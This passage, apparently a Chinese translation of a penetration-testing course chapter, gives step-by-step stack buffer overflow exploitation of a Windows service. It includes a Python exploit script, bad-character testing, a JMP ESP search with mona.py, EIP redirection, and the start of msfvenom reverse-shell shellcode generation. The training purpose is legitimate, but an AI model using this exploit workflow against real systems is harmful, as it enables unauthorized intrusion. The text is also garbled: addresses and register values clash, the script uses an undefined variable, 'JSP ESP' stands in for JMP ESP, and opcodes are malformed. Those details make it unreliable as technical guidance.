
一旦发送了新的更长的缓冲区，可以在调试器中观察到类似的崩溃。然而，这次我们发现 `ESP` 指向一个不同的地址值 `0x030E745C`，如图 216 所示：

```
Registers (FPU)
EAX 00000001
ECX 00554356
EDX 00000352
EBX 00000000
EBP 00554342 ASCII "0000000000000000"
ESP 0045A4B6 ASCII "login"
EDI 00BC0C78
EIP 42244242
```

图 26：栈空间增加

因此，`ESP` 指向 D 字符（十六进制的 `0x44`），作为我们 shellcode 的占位符：

```
030E7448 41414141 AAAA
030E744C 41414141 AAAA
030E7450 41414141 AAAA
030E7454 42244242 BBBB
030E7458 43434343 CCCC
030E745C 44444444 DDDD
030E7460 44444444 DDDD
030E7464 44444444 DDDD
030E7468 44444444 DDDD
030E746C 44444444 DDDD
...
0300E745C 44444444 DDDD
```

列表 353 - 为 shellcode 增加的栈空间

这个小技巧为我们提供了更多的工作空间。通过进一步检查，我们发现 shellcode 共有 704 字节 (`0x030771C-0x030745C`) 的空闲空间。此外，请注意地址每次运行利用程序时都会变化，但仍然指向缓冲区。我们将在后续章节中解决这个问题，但我们还有另一个障碍：

## 11.2.5 检查坏字符

根据应用程序，某些字符是“坏的”，不应放在缓冲区中。缓冲区中一个常见的坏字符是空字节 (`0x0`)，因为它用于终止字符串。此外，由于我们将利用程序作为 POST 请求的一部分发送，应该避免 `0x0D`，它表示字段的结束。

丰富的开发者会通过发送从 `0x00` 到 `0xFF` 的所有字符来检查哪些是坏字符，并查看应用程序如何处理。这样做，我们将重用概念并将 D 替换为所有可能的十六进制字符：

```python
#!/usr/bin/python
import socket

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xca\xcb\xcc\xcd\xce\xf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
)

try:
    print("Sending exploit buffer...")
    filler = "A" * 780
    eip = "B" * 4
    offset = filler + eip + badchars
    inputBuffer = "username=" + inputBuffer + "&password=A"
    content = "username=" + inputBuffer + "&password=A"
```

列表 354 - 包含所有十六进制字符的脚本

在概念证明之后，我们可以右键点击 `ESP` 并选择“在转储文件中跟踪”(`Follow in Dump`)，显示内存中的输入缓冲区十六进制字符（列表 355）：

| 地址 | 值 |
| :--- | :--- |
| 032674c4 | 41414141 AAAA |
| 0326745a | 42424242 BBBB |
| 0326745c | 0102030405060708 |
| 03267469 | 090003009B0C03 |
| 0326746l | 106C040086000000 |
| 03267474 | 18AB26030000000 |

列表 355 - 在栈上截断

# 使用 Kali Linux 2.0 进行渗透测试

```
01B174C 41 41 41 41 41 41 41 AAAAAAA
01B1745 42 42 42 42 43 43 43 BBBBBCC
01B174C 01 02 03 04 05 06 07 00 ...8¦Ì
01B1764 09 08 0C 00 38 BD CE 00
01B1746 10 6C 0F 00 08 06 00 00 L...
01B1747 18 AB 01 01 09 09 00 00 =+....
```

通过这种方式，我们发现尝试溢出目标缓冲区时，`0x00`、`0x0D`、`0x25`、`0x26`、`0x2B` 和 `0x3D` 会破坏我们的输入缓冲区。

### 11.2.5.1 练习

- 1. 按照顺序重复步骤，识别无法包含在负载（`payload`）中的坏字符（`bad characters`）。
- 2. 为什么这些字符不允许？这些坏十六进制字符是如何转换为 ASCII 的？

## 11.2.6 重定向执行流

此时，我们已经控制了 `EIP` 寄存器，并且知道我们可以通过 `ESP` 寄存器轻松访问的内存空间找到我们的 shellcode。我们还知道哪些字符对我们的缓冲区是安全的，哪些是不安全的。我们的下一个任务是找到一种方法将执行流重定向到崩溃时 `ESP` 寄存器指向的内存地址处的 shellcode。

最直观的方法是尝试将 B 替换为崩溃时弹出 `ESP` 寄存器的地址。然而，正如我们之前提到的，`ESP` 的值会随崩溃而变化。栈地址经常变化，尤其是在像 SyncBrowse 这样的多线程应用程序中，因为每个线程都有操作系统分配的内存保留区域。

因此，硬编码栈地址并不是到达我们缓冲区的可靠方法。

## 11.2.7 寻找返回地址

我们仍然可以将 shellcode 存储在 `ESP` 指向的地址，但我们需要一种一致的方法来执行该代码。一种解决方案是使用 `JMP ESP` 指令，正如名称所示，它在执行时会“跳转”到 `ESP` 指向的地址。如果我们找到一个包含此指令的可靠静态地址，我们就可以将 `EIP` 重定向到该地址，并在崩溃时，`JMP ESP` 指令将被执行。这种“间接跳转”将执行流引向我们的 shellcode。

Windows 中的许多库都包含此常用指令，但我们需要找到一个符合某些标准的引用。首先，库中使用的地址必须是静态的，这排除了没有编译 ASLR 支持的库，否则会破坏漏洞，因为该地址将成为我们输入缓冲区的一部分。

# 使用 Kali Linux 2.0 进行渗透测试

我们可以使用由 Corelan 团队开发的 Immunity Debugger 脚本 `mona.py` 开始搜索返回地址。首先，我们将使用 `!mona modules` 请求由 SyncBridge 加载到进程内存空间的所有 DLL（或模块）的信息，产生如图 217 所示的输出：

![](img/f99f528ca9845f4c256ce54e882b1345_385_0.png)

> 图 217：`mona modules` 命令输出

此输出中的列包括当前内存位置（基地址和顶部地址）、模块大小、多个标志位、模块版本、名称和路径。

从此输出的标志位中，我们可以看到 `sync.exe` 有 `SafeSEH`（结构化异常处理覆盖，一种利用技术）、`ASLR` 和 `NX`（`DEP` 已禁用）。换句话说，可执行文件没有编译任何内存保护方案，并且始终在基地址 `0x04000000` 加载，这意味着所有指令（`0XXXX`）将包含空字符，这不适合我们的缓冲区（Corelan, 2019），https://github.com/corelan/mona（Microsoft, 2016），docs.microsoft.com/en-us/reference/safeseh-exception-handlers?view=vs-2015 PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 386

# 使用 Kali Linux 2.0 进行渗透测试

遍历输出，发现 `sync.DLL` 也符合我们的需求。现在我们需要找到该模块中自然出现的 JSP 指令地址。

> 高级提示：如果此应用程序编译了 DEP 支持，你的 ESP 地址将位于模块的 `.text` 段，因为那是唯一同时具有读 (`R`) 和可执行 (`E`) 权限的段。然而，由于 DEP 未启用，我们可以使用该模块中的任何地址。

可以使用 Immunity Debugger 中的原生命令来搜索我们的 JSP 指令。我们可以使用 `mona.py` 对指令的十六进制表示（操作码）进行详尽搜索。找到 JSP ESP 的等效项，可以使用 Metasploit NASM 脚本 `msf-nasm_shell`，它产生了 357 所示的结果：

```
kali@kali: $ msf-nasm_shell
jmp esp
000000 FFE4
```

357 - 寻找 JSP ESP 的操作码

我们可以使用 `mona.py` 在 `sync.DLL` 的所有部分搜索 JSP ESP 的操作码表示（`0FFE4`）。最终命令 `mona find -s "\xff4" -m sync.dll` 的输出如图 218 所示：

```
[+] Command used mona find -s "\xff4" -m sync.dll
[+] Started on 2019-06-14 10:21:03
[+] Arguments and criteria
- Searching for modules in sync.dll
- Only queuing modules into table, hang on...
- Processing modules 
- Treating pattern as bin
- Searching for byte sequence at 0x22300
[+] Creating output 'find.txt'
[+] Matches of type "\xff4"
[+] Writing results to find.txt
[+] Number of pointers to: 1
[+] Results: Found 1 pointer (PAGE_EXECUTE_READ)
[+] mona.py action took 00:00:00.63
```

图 218：使用 `mona.py` 搜索操作码

在本例中，输出显示了一个地址，且幸运的是，该地址不包含任何坏字符。PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 387

为了在执行暂停时在反汇器中查看 `0x100c83` 的内容，我们将点击“转到反汇器”（Go to Disassembler）。从这里我们可以看到它翻译为 `JMP ESP` 指令![](img/f99f528ca9845f4c256ce54e882b1345_387_0.png)

图 219：跳转到反汇器中的特定地址

如果在崩溃时重定向 `EIP`，`JMP ESP` 指令将把执行流引向我们的 shellcode。我们可以通过更新原型代码中的 `EIP` 变量以反映此地址来测试这一点：

```
filler = "A" * 78
eip = "\x83\xc0\x09\x10"
offset = "C" * (1500 - len(filler))
buffer = filler + eip + offset
```

358 - 重定向 EIP

注意下面的地址是倒序的。这是因为操作系统可以使用不同的格式存储地址数据。通常情况下，存储地址的系统取决于架构。小端序（Little endian）是最广泛使用的格式，用于 x86 和 AMD64 架构，而大端序（big endian）历史上曾用于 Spar 和 PowerPC。在小端序中，低位字节存储在内存的最低地址，高位字节存储在最高地址。因此，我们必须在缓冲区中以倒序存储返回地址，以便 CPU 在内存中正确解释它。

使用调试器，我们将在地址 `0x100c83` 处设置断点以跟踪 `JMP ESP` 指令的执行，然后再次运行我们的漏洞。结果如图 220 所示。

> (Wikipedia, 2019), http://en.wikipedia.org/wiki/Endianness

PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 388

# 使用 Kali Linux 2.0 进行渗透测试

```
Immunity Debugger - sync.exe [ | | << | | thread 0000
Registers EIP      00001A0
ESP      0019F0
EBP      0019F4
EAX      0000000
EBX      0000000
ECX      0000000
EDX      0000000
ESI      0000000
EDI      0000000
EBP      0019F4
ESP      0019F0
EIP      00001A0
FLAGS   00000246
CS      0043
DS      0000
SS      0043
ES      0000
FS      0030
GS      0000
```

图 220：`sync.dll` 中的 `JMP ESP` 断点

我们的调试器显示我们到达了 `JMP ESP` 以及我们目前设置的断点。在调试器中按 F7 单步进入 shellcode，目前是一堆 D。

太好了！现在我们需要生成有效的 shellcode，我们的漏洞就可以完成了。

### 11.2.7 练习

- 1. 找到漏洞中使用的 `JMP ESP`。
- 2. 更新你的原型以包含发现的 `JMP ESP`，在其上设置断点并跟踪到占位符。

# 使用 Kali Linux 2.0 进行渗透测试

| 名称 | 描述 |
|---|---|
| aix/rfc/shell_bind_tcp | 监听连接并启动命令 shell |
| aix/rfc/shell_find_port | 在已建立的连接上启动 shell |
| aix/rfc/shell_interact | 简单执行 /bin/sh（针对 inetd 程序） |
| aix/rfc/shell_reverse_tcp | 连接回攻击者并启动命令 shell |

列表 359 - 生成所有 Metasploit 负载的命令

`msfvenom` 命令非常易用。我们使用 `-p` 生成一个名为 `windows/shell_reverse_tcp` 的负载，它的作用类似于一个 Netcat 反向 shell。该负载需要一个 `LHOST` 参数，用于定义 shell 的目标 IP 地址。还可以定义一个可选的 `LPORT` 参数来指定回连端口，我们将使用 `-f` 格式来获取 C 格式的 shell。

生成我们 shellcode 的完整 `msfvenom` 命令如下：
